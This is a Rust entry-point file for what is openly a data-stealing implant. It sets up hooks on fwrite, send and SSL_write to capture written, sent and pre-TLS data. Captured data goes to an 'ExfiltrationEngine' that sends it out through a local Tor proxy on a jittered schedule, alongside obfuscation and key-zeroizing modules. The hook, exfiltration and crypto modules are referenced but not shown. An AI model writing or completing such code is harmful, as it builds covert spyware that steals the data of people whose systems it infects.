use std::sync::Arc;
use tokio::sync::mpsc;
use zeroize::Zeroize;

mod hook;
mod exfil;
mod crypto;
mod buffer;
mod obfuscate;

use hook::HookManager;
use exfil::ExfiltrationEngine;
use crypto::CryptoManager;
use config::MissionConfig;

#[tokio::main]
async fn main() {
    // Load mission configuration
    let mission_config = MissionConfig::load()
        .unwrap_or_else(|e| {
            eprintln!("[SEED] Warning: Failed to load mission config: {} (using defaults)", e);
            // Return default config
            MissionConfig {
                mission_id: 0xDEADBEEFCAFEBABE,
                mission_name: "Default Mission".to_string(),
                exfiltration_interval: 347,
                exfiltration_jitter: 0.25,
                tor_proxy: "127.0.0.1:9050".to_string(),
                hooks: vec!["fwrite".to_string(), "send".to_string(), "SSL_write".to_string()],
                filters: vec![],
            }
        });
    
    println!("[SEED] Mission: {} (ID: 0x{:X})", mission_config.mission_name, mission_config.mission_id);
    
    // Initialize components
    let hook_manager = Arc::new(HookManager::new());
    let crypto_manager = Arc::new(CryptoManager::new());
    
    // Create communication channels
    let (data_tx, data_rx) = mpsc::unbounded_channel();
    
    // Start hook manager
    let hook_mgr = hook_manager.clone();
    tokio::spawn(async move {
        hook_mgr.start_capture(data_tx).await;
    });
    
    // Start exfiltration engine
    let exfil_engine = ExfiltrationEngine::new(crypto_manager, data_rx);
    exfil_engine.start().await;
}

